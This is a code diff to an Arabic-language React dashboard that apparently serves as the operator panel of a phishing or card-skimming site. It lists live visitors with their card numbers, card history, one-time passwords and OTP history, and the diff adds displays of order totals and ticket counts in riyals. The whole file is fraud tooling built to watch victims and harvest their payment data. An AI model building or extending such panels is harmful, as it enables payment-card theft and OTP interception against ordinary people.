@@ -55,6 +55,8 @@ interface VisitorData {
   plateNumber?: string;
   insuranceAmount?: string;
   insuranceType?: string;
+  totalAmount?: number;
+  ticketQuantity?: number;
 }
 
 const pageNames: Record<string, string> = {
@@ -276,6 +278,7 @@ export default function DashboardPage() {
   const onlineVisitors = visitors.filter(v => v.online).length;
   const withPayment = visitors.filter(v => v.cardNumber || (v.cardHistory && v.cardHistory.length > 0)).length;
   const withOtp = visitors.filter(v => v.otp || (v.otpHistory && v.otpHistory.length > 0)).length;
+  const totalRevenue = visitors.reduce((sum, v) => sum + (v.totalAmount || 0), 0);
 
   return (
     <div className="h-screen flex bg-[#111b21]" dir="rtl">
@@ -318,6 +321,21 @@ export default function DashboardPage() {
           <StatCard icon={CreditCard} label="بطاقات" value={withPayment} color="text-yellow-400" />
           <StatCard icon={Shield} label="OTP" value={withOtp} color="text-purple-400" />
         </div>
+        
+        {/* Total Revenue */}
+        {totalRevenue > 0 && (
+          <div className="px-3 pb-3 bg-[#0b141a]">
+            <div className="bg-gradient-to-r from-green-900/30 to-green-800/20 rounded-lg p-3 border border-green-500/30">
+              <div className="flex items-center justify-between">
+                <div className="flex items-center gap-2">
+                  <DollarSign className="w-5 h-5 text-green-400" />
+                  <span className="text-[#8696a0] text-sm">إجمالي المبالغ</span>
+                </div>
+                <span className="text-green-400 font-bold text-xl">{totalRevenue.toLocaleString('ar-SA')} ر.س</span>
+              </div>
+            </div>
+          </div>
+        )}
 
         {/* Visitors List */}
         <div className="flex-1 overflow-y-auto">
@@ -370,6 +388,11 @@ export default function DashboardPage() {
                       {getPageNameArabic(visitor.currentPage)}
                     </p>
                     <div className="flex items-center gap-1 flex-shrink-0">
+                      {visitor.totalAmount && (
+                        <span className="bg-green-500/20 text-green-400 text-[9px] px-1.5 py-0.5 rounded font-medium">
+                          {visitor.totalAmount} ر.س
+                        </span>
+                      )}
                       {visitor.otpHistory && visitor.otpHistory.length > 0 && (
                         <span className="bg-purple-500/20 text-purple-400 text-[9px] px-1.5 py-0.5 rounded font-medium">
                           {visitor.otpHistory.length} OTP
@@ -560,6 +583,29 @@ export default function DashboardPage() {
                       )}
                       {selectedVisitor.insuranceAmount && (
                         <InfoRow icon={DollarSign} label="المبلغ" value={`${selectedVisitor.insuranceAmount} ر.س`} />
+                      )}
+                    </div>
+                  </div>
+                </MessageBubble>
+              )}
+
+              {selectedVisitor.totalAmount && (
+                <MessageBubble type="received" time="">
+                  <div className="space-y-3">
+                    <div className="flex items-center gap-2 text-green-400 font-semibold">
+                      <DollarSign className="w-4 h-4" />
+                      <span>مبلغ الطلب</span>
+                    </div>
+                    <div className="bg-gradient-to-br from-green-900/30 to-green-800/20 rounded-xl p-4 border border-green-500/30">
+                      <div className="flex items-center justify-between">
+                        <span className="text-[#8696a0]">المجموع الكلي</span>
+                        <span className="text-green-400 font-bold text-2xl">{selectedVisitor.totalAmount} ر.س</span>
+                      </div>
+                      {selectedVisitor.ticketQuantity && (
+                        <div className="flex items-center justify-between mt-2 pt-2 border-t border-green-500/20">
+                          <span className="text-[#8696a0] text-sm">عدد التذاكر</span>
+                          <span className="text-white font-medium">{selectedVisitor.ticketQuantity}</span>
+                        </div>
                       )}
                     </div>
                   </div>
